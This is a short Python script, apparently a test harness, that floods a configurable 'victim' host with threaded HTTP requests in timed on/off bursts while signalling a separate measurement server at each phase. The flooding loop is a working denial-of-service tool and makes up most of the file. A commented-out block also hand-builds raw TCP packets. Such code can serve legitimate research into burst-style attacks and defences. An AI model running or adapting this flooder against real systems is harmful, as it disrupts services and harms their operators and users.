import os
import time
import threading
import requests

config=dict(os.environ)
measure=config['measure']
victim=config['victim']

burst="""/json"""

###########################################
# generate a request
###########################################
def send_request(host,payload):
	print(payload)
	requests.get("http://{host}{payload}".format(host=host,payload=payload))
	'''payload=raw_payload%(host)
	syn=IP(dst=host)/TCP(dport=port,flags='S')
	syn_ack = sr1(syn,verbose=0)
	request=IP(dst=host)/TCP(dport=port,sport=syn_ack[TCP].dport,seq=syn_ack[TCP].ack,ack=syn_ack[TCP].seq+1,flags='A')/payload
	response=sr1(request,verbose=1)
	print(response)'''
	return 0

###########################################
# generate burst for d seconds
###########################################
def sequence_on(p):

	end=time.time()+p

	send_request(measure,"/On/Start")
	
	# notify measurement process of the burst start
	send_request(measure,"/On/Burst")
	print("flooding")
	
	# send bursts to victim, each burst lasts for p seconds
	while(time.time()<end):
		t=threading.Thread(target=timeout_worker,args=(send_request,{"host":victim,"payload":burst},end,'burst'))
		t.start()

	# notify measurement process that the burst is over
	send_request(measure,"/On/Idle")
	print("iteration complete")
	
	# the burst is repeated after 10-p seconds
	time.sleep(10-p)
	
	# notify measurement process that the test iteration is over
	send_request(measure,"/On/Iteration")

###########################################
# idle for d seconds
###########################################
def sequence_off(p):
	
	end=time.time()+p
	
	send_request(measure,"/Off/Start")

	# notify measurement process of the idle start
	send_request(measure,"/Off/Noise")
	
	# do nothing
	while(time.time()<end):
		1
	
	# notify measurement process that the idle is over
	send_request(measure,"/Off/Idle")
	
	# the burst is repeated after 10-p seconds
	time.sleep(10-p)

	# notify measurement process that the test iteration is over
	send_request(measure,"/Off/Iteration")

###########################################
# run till N seconds
###########################################
def timeout_worker(function,params,timeout,mode):
	while(time.time()<timeout):
		function(**params)
		if mode=='burst':
			continue
		else:
			break
	return 0

###########################################
# run sequences
###########################################
def run(p,d):
	print("on sequence")
	end=time.time()+d
	t=threading.Thread(target=timeout_worker,args=(sequence_on,{"p":p},end,'burst'))
	t.run()
	print("off sequence")
	end=time.time()+d
	t=threading.Thread(target=timeout_worker,args=(sequence_off,{"p":p},end,'burst'))
	t.run()

run(5,100)